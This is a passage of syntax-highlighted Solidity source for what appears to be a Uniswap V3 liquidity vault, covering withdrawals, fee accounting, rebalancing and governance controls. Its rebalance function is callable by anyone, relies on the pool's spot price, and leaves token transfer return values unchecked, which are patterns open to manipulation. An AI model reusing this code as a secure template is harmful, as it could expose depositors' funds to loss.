</span><span>        </span><span style=color:#969896;font-style:italic>// Push tokens to recipient
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token0.</span><span style=color:#62a35c>transfer</span><span>(to, amount0);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token1.</span><span style=color:#62a35c>transfer</span><span>(to, amount1);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Withdraw</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, to, shares, amount0, amount1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_burnLiquidityShare</span><span>(
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickLower,
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickUpper,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>shares,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_totalSupply
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal returns </span><span>(</span><span style=color:#0086b3>uint256</span><span> amount0, </span><span style=color:#0086b3>uint256</span><span> amount1) {
</span><span>        (</span><span style=color:#0086b3>uint128</span><span> totalLiquidity, , , , ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_position</span><span>(tickLower, tickUpper);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> liquidity </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(</span><span style=color:#0086b3>uint256</span><span>(totalLiquidity), shares, _totalSupply);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(liquidity </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>            (</span><span style=color:#0086b3>uint256</span><span> burned0, </span><span style=color:#0086b3>uint256</span><span> burned1, </span><span style=color:#0086b3>uint256</span><span> fees0, </span><span style=color:#0086b3>uint256</span><span> fees1) </span><span style=color:#a71d5d;font-weight:700>=
</span><span>                </span><span style=color:#62a35c>_burnAndCollect</span><span>(tickLower, tickUpper, </span><span style=color:#62a35c>_toUint128</span><span>(liquidity));
</span><span>
</span><span>            </span><span style=color:#969896;font-style:italic>// Add share of fees
</span><span>            amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> burned0 </span><span style=color:#a71d5d;font-weight:700>+</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(fees0, shares, _totalSupply);
</span><span>            amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> burned1 </span><span style=color:#a71d5d;font-weight:700>+</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(fees1, shares, _totalSupply);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>rebalance</span><span>() </span><span style=color:#a71d5d;font-weight:700>external nonReentrant </span><span>{
</span><span>        (, </span><span style=color:#0086b3>int24</span><span> tick, , , , , ) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>slot0</span><span>();
</span><span>        </span><span style=color:#0086b3>int24</span><span> diff </span><span style=color:#a71d5d;font-weight:700>=</span><span> tick </span><span style=color:#a71d5d;font-weight:700>></span><span> lastTick </span><span style=color:#a71d5d;font-weight:700>?</span><span> tick </span><span style=color:#a71d5d;font-weight:700>-</span><span> lastTick </span><span style=color:#a71d5d;font-weight:700>:</span><span> lastTick </span><span style=color:#a71d5d;font-weight:700>-</span><span> tick;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(diff </span><span style=color:#a71d5d;font-weight:700>>=</span><span> 5 </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing, </span><span style=color:#183691>"price diff"</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>int24</span><span> _baseLower </span><span style=color:#a71d5d;font-weight:700>= </span><span>(tick </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>int24</span><span>(</span><span style=color:#0086b3>10</span><span>) </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing) </span><span style=color:#a71d5d;font-weight:700>/</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>></span><span> TickMath.MIN_TICK 
</span><span>            </span><span style=color:#a71d5d;font-weight:700>? </span><span>(tick </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>int24</span><span>(</span><span style=color:#0086b3>10</span><span>) </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing) </span><span style=color:#a71d5d;font-weight:700>/</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>:</span><span> TickMath.MIN_TICK;
</span><span>        </span><span style=color:#0086b3>int24</span><span> _baseUpper </span><span style=color:#a71d5d;font-weight:700>= </span><span>(tick </span><span style=color:#a71d5d;font-weight:700>+ </span><span style=color:#0086b3>int24</span><span>(</span><span style=color:#0086b3>10</span><span>) </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing) </span><span style=color:#a71d5d;font-weight:700>/</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> TickMath.MAX_TICK 
</span><span>            </span><span style=color:#a71d5d;font-weight:700>? </span><span>(tick </span><span style=color:#a71d5d;font-weight:700>+ </span><span style=color:#0086b3>int24</span><span>(</span><span style=color:#0086b3>10</span><span>) </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing) </span><span style=color:#a71d5d;font-weight:700>/</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>*</span><span> tickSpacing </span><span style=color:#a71d5d;font-weight:700>:</span><span> TickMath.MAX_TICK;
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Withdraw all current liquidity from Uniswap pool
</span><span>        {
</span><span>            (</span><span style=color:#0086b3>uint128</span><span> baseLiquidity, , , , ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_position</span><span>(baseLower, baseUpper);
</span><span>            </span><span style=color:#62a35c>_burnAndCollect</span><span>(baseLower, baseUpper, baseLiquidity);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Emit snapshot to record balances and supply
</span><span>        </span><span style=color:#0086b3>uint256</span><span> balance0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getBalance0</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getBalance1</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Snapshot</span><span>(tick, balance0, balance1, </span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Place base order on Uniswap
</span><span>        </span><span style=color:#0086b3>uint128</span><span> liquidity </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_liquidityForAmounts</span><span>(_baseLower, _baseUpper, balance0, balance1);
</span><span>        </span><span style=color:#62a35c>_mintLiquidity</span><span>(_baseLower, _baseUpper, liquidity);
</span><span>        lastTick </span><span style=color:#a71d5d;font-weight:700>=</span><span> tick;
</span><span>        (baseLower, baseUpper) </span><span style=color:#a71d5d;font-weight:700>= </span><span>(_baseLower, _baseUpper);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_burnAndCollect</span><span>(
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickLower,
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickUpper,
</span><span>        </span><span style=color:#0086b3>uint128 </span><span>liquidity
</span><span>    )
</span><span>        </span><span style=color:#a71d5d;font-weight:700>internal
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(
</span><span>            </span><span style=color:#0086b3>uint256</span><span> burned0,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> burned1,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> feesToVault0,
</span><span>            </span><span style=color:#0086b3>uint256</span><span> feesToVault1
</span><span>        )
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(liquidity </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>            (burned0, burned1) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>burn</span><span>(tickLower, tickUpper, liquidity);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Collect all owed tokens including earned fees
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> collect0, </span><span style=color:#0086b3>uint256</span><span> collect1) </span><span style=color:#a71d5d;font-weight:700>=
</span><span>            pool.</span><span style=color:#62a35c>collect</span><span>(
</span><span>                </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>),
</span><span>                tickLower,
</span><span>                tickUpper,
</span><span>                </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint128</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>,
</span><span>                </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint128</span><span>).</span><span style=color:#a71d5d;font-weight:700>max
</span><span>            );
</span><span>
</span><span>        feesToVault0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> collect0 </span><span style=color:#a71d5d;font-weight:700>-</span><span> burned0;
</span><span>        feesToVault1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> collect1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> burned1;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> feesToProtocol0;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> feesToProtocol1;
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Update accrued protocol fees
</span><span>        </span><span style=color:#0086b3>uint256</span><span> _protocolFee </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolFee;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(_protocolFee </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>            feesToProtocol0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(feesToVault0, _protocolFee, 1e6);
</span><span>            feesToProtocol1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> FullMath.</span><span style=color:#62a35c>mulDiv</span><span>(feesToVault1, _protocolFee, 1e6);
</span><span>            feesToVault0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> feesToVault0 </span><span style=color:#a71d5d;font-weight:700>-</span><span> feesToProtocol0;
</span><span>            feesToVault1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> feesToVault1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> feesToProtocol1;
</span><span>            accruedProtocolFees0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> accruedProtocolFees0 </span><span style=color:#a71d5d;font-weight:700>+</span><span> feesToProtocol0;
</span><span>            accruedProtocolFees1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> accruedProtocolFees1 </span><span style=color:#a71d5d;font-weight:700>+</span><span> feesToProtocol1;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>CollectFees</span><span>(feesToVault0, feesToVault1, feesToProtocol0, feesToProtocol1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_mintLiquidity</span><span>(
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickLower,
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickUpper,
</span><span>        </span><span style=color:#0086b3>uint128 </span><span>liquidity
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(liquidity </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) {
</span><span>            pool.</span><span style=color:#62a35c>mint</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), tickLower, tickUpper, liquidity, </span><span style=color:#183691>""</span><span>);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getTotalAmounts</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span> total0, </span><span style=color:#0086b3>uint256</span><span> total1) {
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> baseAmount0, </span><span style=color:#0086b3>uint256</span><span> baseAmount1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getPositionAmounts</span><span>(baseLower, baseUpper);
</span><span>        total0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getBalance0</span><span>() </span><span style=color:#a71d5d;font-weight:700>+</span><span> baseAmount0;
</span><span>        total1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getBalance1</span><span>() </span><span style=color:#a71d5d;font-weight:700>+</span><span> baseAmount1;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getPositionAmounts</span><span>(</span><span style=color:#0086b3>int24 </span><span>tickLower, </span><span style=color:#0086b3>int24 </span><span>tickUpper)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>public
</span><span>        </span><span style=color:#a71d5d;font-weight:700>view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>uint256</span><span> amount0, </span><span style=color:#0086b3>uint256</span><span> amount1)
</span><span>    {
</span><span>        (</span><span style=color:#0086b3>uint128</span><span> liquidity, , , </span><span style=color:#0086b3>uint128</span><span> tokensOwed0, </span><span style=color:#0086b3>uint128</span><span> tokensOwed1) </span><span style=color:#a71d5d;font-weight:700>=
</span><span>            </span><span style=color:#62a35c>_position</span><span>(tickLower, tickUpper);
</span><span>        (amount0, amount1) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_amountsForLiquidity</span><span>(tickLower, tickUpper, liquidity);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Subtract protocol fees
</span><span>        </span><span style=color:#0086b3>uint256</span><span> oneMinusFee </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint256</span><span>(1e6) </span><span style=color:#a71d5d;font-weight:700>-</span><span> protocolFee;
</span><span>        amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount0 </span><span style=color:#a71d5d;font-weight:700>+ </span><span>(</span><span style=color:#0086b3>uint256</span><span>(tokensOwed0) </span><span style=color:#a71d5d;font-weight:700>*</span><span> oneMinusFee </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e6);
</span><span>        amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount1 </span><span style=color:#a71d5d;font-weight:700>+ </span><span>(</span><span style=color:#0086b3>uint256</span><span>(tokensOwed1) </span><span style=color:#a71d5d;font-weight:700>*</span><span> oneMinusFee </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e6);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getBalance0</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> accruedProtocolFees0;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getBalance1</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> accruedProtocolFees1;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_position</span><span>(</span><span style=color:#0086b3>int24 </span><span>tickLower, </span><span style=color:#0086b3>int24 </span><span>tickUpper)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>internal
</span><span>        </span><span style=color:#a71d5d;font-weight:700>view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(
</span><span>            </span><span style=color:#0086b3>uint128</span><span>,
</span><span>            </span><span style=color:#0086b3>uint256</span><span>,
</span><span>            </span><span style=color:#0086b3>uint256</span><span>,
</span><span>            </span><span style=color:#0086b3>uint128</span><span>,
</span><span>            </span><span style=color:#0086b3>uint128
</span><span>        )
</span><span>    {
</span><span>        </span><span style=color:#0086b3>bytes32</span><span> positionKey </span><span style=color:#a71d5d;font-weight:700>=</span><span> PositionKey.</span><span style=color:#62a35c>compute</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), tickLower, tickUpper);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> pool.</span><span style=color:#62a35c>positions</span><span>(positionKey);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_amountsForLiquidity</span><span>(
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickLower,
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickUpper,
</span><span>        </span><span style=color:#0086b3>uint128 </span><span>liquidity
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>, </span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        (</span><span style=color:#0086b3>uint160</span><span> sqrtRatioX96, , , , , , ) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>slot0</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return
</span><span>            LiquidityAmounts.</span><span style=color:#62a35c>getAmountsForLiquidity</span><span>(
</span><span>                sqrtRatioX96,
</span><span>                TickMath.</span><span style=color:#62a35c>getSqrtRatioAtTick</span><span>(tickLower),
</span><span>                TickMath.</span><span style=color:#62a35c>getSqrtRatioAtTick</span><span>(tickUpper),
</span><span>                liquidity
</span><span>            );
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_liquidityForAmounts</span><span>(
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickLower,
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickUpper,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal view returns </span><span>(</span><span style=color:#0086b3>uint128</span><span>) {
</span><span>        (</span><span style=color:#0086b3>uint160</span><span> sqrtRatioX96, , , , , , ) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>slot0</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return
</span><span>            LiquidityAmounts.</span><span style=color:#62a35c>getLiquidityForAmounts</span><span>(
</span><span>                sqrtRatioX96,
</span><span>                TickMath.</span><span style=color:#62a35c>getSqrtRatioAtTick</span><span>(tickLower),
</span><span>                TickMath.</span><span style=color:#62a35c>getSqrtRatioAtTick</span><span>(tickUpper),
</span><span>                amount0,
</span><span>                amount1
</span><span>            );
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_toUint128</span><span>(</span><span style=color:#0086b3>uint256 </span><span>x) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint128</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>assert</span><span>(x </span><span style=color:#a71d5d;font-weight:700>&lt;= type</span><span>(</span><span style=color:#0086b3>uint128</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>uint128</span><span>(x);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uniswapV3MintCallback</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external override </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(pool));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token0.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount0);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token1.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uniswapV3SwapCallback</span><span>(
</span><span>        </span><span style=color:#0086b3>int256 </span><span>amount0Delta,
</span><span>        </span><span style=color:#0086b3>int256 </span><span>amount1Delta,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external override </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(pool));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0Delta </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token0.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>uint256</span><span>(amount0Delta));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1Delta </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token1.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>uint256</span><span>(amount1Delta));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>collectProtocol</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount0,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount1,
</span><span>        </span><span style=color:#0086b3>address </span><span>to
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external onlyGovernance </span><span>{
</span><span>        accruedProtocolFees0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> accruedProtocolFees0 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount0;
</span><span>        accruedProtocolFees1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> accruedProtocolFees1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount1;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token0.</span><span style=color:#62a35c>transfer</span><span>(to, amount0);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token1.</span><span style=color:#62a35c>transfer</span><span>(to, amount1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sweep</span><span>(
</span><span>        </span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount,
</span><span>        </span><span style=color:#0086b3>address </span><span>to
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external onlyGovernance </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(token </span><span style=color:#a71d5d;font-weight:700>!=</span><span> token0 </span><span style=color:#a71d5d;font-weight:700>&&</span><span> token </span><span style=color:#a71d5d;font-weight:700>!=</span><span> token1, </span><span style=color:#183691>"token"</span><span>);
</span><span>        token.</span><span style=color:#62a35c>transfer</span><span>(to, amount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setProtocolFee</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_protocolFee) </span><span style=color:#a71d5d;font-weight:700>external onlyGovernance </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_protocolFee </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> 1e6, </span><span style=color:#183691>"protocolFee"</span><span>);
</span><span>        protocolFee </span><span style=color:#a71d5d;font-weight:700>=</span><span> _protocolFee;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setMaxTotalSupply</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_maxTotalSupply) </span><span style=color:#a71d5d;font-weight:700>external onlyGovernance </span><span>{
</span><span>        maxTotalSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> _maxTotalSupply;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>emergencyBurn</span><span>(
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickLower,
</span><span>        </span><span style=color:#0086b3>int24 </span><span>tickUpper,
</span><span>        </span><span style=color:#0086b3>uint128 </span><span>liquidity
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external onlyGovernance </span><span>{
</span><span>        pool.</span><span style=color:#62a35c>burn</span><span>(tickLower, tickUpper, liquidity);
</span><span>        pool.</span><span style=color:#62a35c>collect</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), tickLower, tickUpper, </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint128</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>, </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint128</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setGovernance</span><span>(</span><span style=color:#0086b3>address </span><span>_governance) </span><span style=color:#a71d5d;font-weight:700>external onlyGovernance </span><span>{
</span><span>        pendingGovernance </span><span style=color:#a71d5d;font-weight:700>=</span><span> _governance;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>acceptGovernance</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> pendingGovernance, </span><span style=color:#183691>"pendingGovernance"</span><span>);
</span><span>        governance </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>onlyGovernance </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> governance, </span><span style=color:#183691>"governance"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>}
